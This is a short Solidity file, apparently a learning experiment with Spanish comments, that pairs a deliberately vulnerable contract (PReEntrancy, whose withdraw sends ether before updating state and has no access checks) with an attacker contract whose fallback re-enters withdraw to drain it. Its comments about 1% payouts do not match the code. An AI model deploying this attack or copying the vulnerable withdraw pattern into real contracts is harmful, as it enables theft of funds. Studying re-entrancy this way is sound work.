// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* @remind PRUEBA si se hace un re-entrancy attack, el codigo no ejecutado si se queda pendiente. Si se vuelve a llamar a withdraw 10 veces, el counter sera 10  */

contract PReEntrancyAttack {
    PReEntrancy _PReEntrancy;

    constructor(PReEntrancy _pReEntrancy) {
        _PReEntrancy = _pReEntrancy;
    }

    fallback() external payable {
        uint balance = address(_PReEntrancy).balance;
        if (balance >= 10) _PReEntrancy.withdraw();
    }

    // withdraw 1% to recipient and 1% to owner
    function callW() public {
        _PReEntrancy.withdraw();
    }
}

contract PReEntrancy {
    uint8 counter = 0;

    constructor() payable {}

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        msg.sender.call{value: 10}("");
        counter++;
    }

    function contractBalance() public view returns (uint, uint8) {
        return (address(this).balance, counter);
    }
}
